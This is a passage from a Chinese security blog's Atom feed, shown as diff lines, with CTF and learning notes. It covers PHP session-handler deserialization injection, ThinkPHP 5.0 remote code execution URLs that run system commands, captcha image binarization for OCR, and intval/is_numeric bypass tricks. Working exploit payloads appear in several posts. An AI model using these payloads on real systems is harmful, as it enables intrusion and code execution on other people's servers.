$mdzz;    function __construct()    {        $this->mdzz = 'phpinfo();';    }    function __destruct()    {        eval($this->mdzz);    }}if(isset($_GET['phpinfo'])){    $m = new OowoO();}else{    highlight_string(file_get_contents('index.php'));}?><p>看到这里使用了ini_set(‘sessionserialize_handler’:’php’),有预感会出现handler不一样的问题</p><p>接下来查看phpinfo，发现php版本是5.6.21，大于5.5.4，默认的handler是php_serialize，会出现上面所述的问题</p><p>在使用session_start()时会自动加载session文件中的值，因为在这里在__destruct方法中使用eval，所以只要在session文件中写入这个类，就能够执行代码？</p><p>但是我们如何将类写入session文件？</p><p>这就用到刚才提到的东西，查看phpinfo，<br>因为session.upload_progress.enabled=1，所以我们就可以post一个和session.upload_progress.name同名的变量，来使得我们上传的文件名写入session</p><p>因为这里是php handler，是以|开头的，所以在反序列化时会按照|来识别键值对而不是按照默认的php_serialize来识别session，所以我们将文件名改为</p><p>“|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}”<br>来读取文件目录</p><p>问题<br>session部分的问题大致是解决了……剩下的问题就是……为什么要将双引号转义？暂时还没有弄清楚，待日后分析吧</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;前言&lt;br&gt;php的session信息是储存在文件中的&lt;/p&gt;
-&lt;p&gt;session.save_path=”” 指定储存的路径&lt;br&gt;session.save_handler=”” 指定储存时使用的函数（默认是file）&lt;br&gt;session.auto_start bool
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>PHP_RCE</title>
-    <link href="http://yoursite.com/2020/03/08/PHP-RCE/"/>
-    <id>http://yoursite.com/2020/03/08/PHP-RCE/</id>
-    <published>2020-03-08T10:22:17.000Z</published>
-    <updated>2020-03-08T10:24:47.722Z</updated>
-    
-    <content type="html"><![CDATA[<p>漏洞利用：ThinkPHP 5.0<br>此框架存在远程代码执行漏洞<br>漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。</p><p>在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。</p><p>我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是<a href="http://127.0.01/anquan" target="_blank" rel="noopener">http://127.0.01/anquan</a> ，我们可以直接在index.php后面伪造攻击参数，示例如下：</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</a><br>通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存放的地址，都可以看得到，构造如下代码即可。</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;</a></p><p>但是我想能不能输入一句话木马，其实是可以的，但是我在攻防世界的题目中用蚁剑没有连入成功。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;漏洞利用：ThinkPHP 5.0&lt;br&gt;此框架存在远程代码执行漏洞&lt;br&gt;漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。&lt;
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>图片验证码灰度化、二值化处理</title>
-    <link href="http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/"/>
-    <id>http://yoursite.com/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/</id>
-    <published>2020-03-03T05:50:03.000Z</published>
-    <updated>2020-03-03T05:52:07.110Z</updated>
-    
-    <content type="html"><![CDATA[<pre><code>import tesserocrfrom PIL import Imageimage = Image.open(&#39;code2.jpg&#39;)image = image.convert(&#39;L&#39;)threshold = 127table = []for i in range(256):    if i &lt; threshold:        table.append(0)    else:        table.append(1)</code></pre><p>   二：</p><pre><code>from PIL import  Imageimport subprocessimage = Image.open(&#39;code.jpg&#39;)image = image.point(lambda x: 0 if x&lt;127 else 255)image.save(&#39;code2.jpg&#39;)subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;])with open(&#39;output.txt&#39;, &#39;r&#39;) as f:    print(f.read())</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;pre&gt;&lt;code&gt;import tesserocr
-from PIL import Image
-
-image = Image.open(&amp;#39;code2.jpg&amp;#39;)
-
-image = image.convert(&amp;#39;L&amp;#39;)
-threshold = 1
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</title>
-    <link href="http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/"/>
-    <id>http://yoursite.com/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/</id>
-    <published>2020-02-27T02:19:25.000Z</published>
-    <updated>2020-02-27T02:19:26.587Z</updated>
-    
-    <content type="html"><![CDATA[<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p><p>intval($req[“number”])=intval(strrev($req[“number”]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Intval函数获取变量整数数值&lt;br&gt;Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 21474836
       
     
     </summary>
